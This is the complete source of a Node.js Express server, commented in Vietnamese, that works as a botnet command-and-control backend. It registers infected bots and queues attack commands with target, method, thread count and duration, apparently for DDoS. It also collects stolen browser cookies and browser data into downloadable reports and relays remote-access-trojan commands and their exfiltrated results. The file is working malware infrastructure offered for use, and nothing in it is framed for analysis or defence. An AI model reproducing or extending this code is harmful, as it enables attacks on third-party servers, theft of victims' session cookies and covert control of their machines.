const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);

app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));
app.use('/methods', express.static('methods'));

// ===== DỮ LIỆU =====
let bots = {};
let pendingCommands = {};
let infoData = {};

// ===== DỌN BOT CHẾT =====
setInterval(() => {
    let now = new Date();
    for (let id in bots) {
        if ((now - new Date(bots[id].lastSeen)) > 15000) {
            delete bots[id];
            delete infoData[id];
        }
    }
}, 10000);

// ===== BOT ĐĂNG KÝ =====
app.post('/api/register', (req, res) => {
    const { id, hostname, ip } = req.body;
    for (let oldId in bots) {
        if (bots[oldId].hostname === hostname && oldId !== id) {
            delete bots[oldId];
            delete infoData[oldId];
        }
    }
    bots[id] = {
        id, hostname: hostname || 'Unknown', ip: ip || req.ip,
        online: true, status: 'ONLINE', target: '', method: '',
        cpu: 0, ram: 0, gpu: 'Unknown', cookies: '', lastSeen: new Date()
    };
    res.json({ ok: true });
});

// ===== BOT CHECK LỆNH =====
app.post('/api/check', (req, res) => {
    const { id } = req.body;
    if (bots[id]) { bots[id].lastSeen = new Date(); bots[id].online = true; }
    let cmd = pendingCommands['ALL'] || pendingCommands[id] || null;
    if (cmd) { delete pendingCommands['ALL']; delete pendingCommands[id]; }
    res.json(cmd || { action: 'none' });
});

// ===== BOT BÁO CÁO =====
app.post('/api/report', (req, res) => {
    const { id, status, target, method } = req.body;
    if (bots[id]) {
        bots[id].status = status || 'ONLINE';
        bots[id].target = target || '';
        bots[id].method = method || '';
        bots[id].lastSeen = new Date();
    }
    res.json({ ok: true });
});

// ===== BOT BÁO CÁO THÔNG TIN =====
app.post('/api/reportinfo', (req, res) => {
    const { id, cpu, ram, gpu, cookies, browsers } = req.body;
    if (bots[id]) {
        bots[id].cpu = cpu || 0; bots[id].ram = ram || 0;
        bots[id].gpu = gpu || 'Unknown'; bots[id].cookies = cookies || '';
        bots[id].browsers = browsers || ''; bots[id].lastSeen = new Date();
    }
    infoData[id] = { id, cpu, ram, gpu, cookies, browsers, time: new Date().toISOString() };
    res.json({ ok: true });
});

// ===== PANEL GỬI LỆNH TẤN CÔNG =====
app.post('/api/attack', (req, res) => {
    const { botId, method, target, threads, duration, proxyFile } = req.body;
    const cmd = { action: 'attack', method, target, threads: parseInt(threads)||100, duration: parseInt(duration)||60, proxyFile: proxyFile||'' };
    if (botId === 'ALL') pendingCommands['ALL'] = cmd;
    else if (botId) pendingCommands[botId] = cmd;
    res.json({ ok: true, cmd });
});

// ===== PANEL DỪNG TẤN CÔNG =====
app.post('/api/stop', (req, res) => {
    const { botId } = req.body;
    if (botId === 'ALL') pendingCommands['ALL'] = { action: 'stop' };
    else if (botId) pendingCommands[botId] = { action: 'stop' };
    res.json({ ok: true });
});

// ===== LẤY THÔNG TIN BOT =====
app.post('/api/getinfo', (req, res) => {
    const { botId } = req.body;
    if (botId === 'ALL') pendingCommands['ALL'] = { action: 'getinfo' };
    else if (botId) pendingCommands[botId] = { action: 'getinfo' };
    res.json({ ok: true });
});

// ===== TẢI FILE THÔNG TIN =====
app.get('/api/downloadinfo/:id', (req, res) => {
    const id = req.params.id;
    const bot = bots[id]; const info = infoData[id] || {};
    if (!bot) return res.status(404).send('Bot not found');
    let txt = `╔══════════════════════════════════════╗\n║     BOT INFORMATION REPORT           ║\n╚══════════════════════════════════════╝\n\n`;
    txt += `Bot ID:        ${id}\nHostname:      ${bot.hostname}\nIP Address:    ${bot.ip}\nStatus:        ${bot.status}\nLast Seen:     ${bot.lastSeen}\n\n`;
    txt += `─── SYSTEM INFO ───\nCPU:           ${info.cpu||'N/A'}%\nRAM:           ${info.ram||'N/A'}%\nGPU:           ${info.gpu||'N/A'}\n\n`;
    txt += `─── BROWSER DATA ───\nBrowsers:      ${info.browsers||'N/A'}\n\n─── COOKIES ───\n${info.cookies||'No cookies'}\n\n─── TIMESTAMP ───\nReport Time:   ${info.time||'N/A'}\n`;
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', `attachment; filename=bot_${bot.hostname}_${id.substring(0,8)}.txt`);
    res.send(txt);
});

// ===== RAT: GỬI LỆNH =====
app.post('/api/rat', (req, res) => {
    const { botId, action, params } = req.body;
    const cmd = { action: 'rat', ratAction: action, params: params || '' };
    if (botId === 'ALL') pendingCommands['ALL'] = cmd;
    else if (botId) pendingCommands[botId] = cmd;
    res.json({ ok: true });
});

// ===== RAT: NHẬN DỮ LIỆU =====
app.post('/api/ratdata', (req, res) => {
    const { id, type, data } = req.body;
    if (!infoData[id]) infoData[id] = {};
    infoData[id]['rat_' + type] = data;
    infoData[id].time = new Date().toISOString();
    if (bots[id]) bots[id].lastSeen = new Date();
    res.json({ ok: true });
});

// ===== RAT: TẢI DỮ LIỆU =====
app.get('/api/ratdata/:id/:type', (req, res) => {
    const id = req.params.id;
    const type = 'rat_' + req.params.type;
    const data = infoData[id] ? infoData[id][type] : null;
    if (!data) return res.json({ error: 'No data' });
    res.json({ id, type, data });
});

// ===== DANH SÁCH BOT =====
app.get('/api/bots', (req, res) => {
    let online = {};
    for (let id in bots) if (bots[id].online) online[id] = bots[id];
    res.json(online);
});

// ===== PANEL HTML =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'panel.html'));
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log('C2 Server running on port ' + PORT));
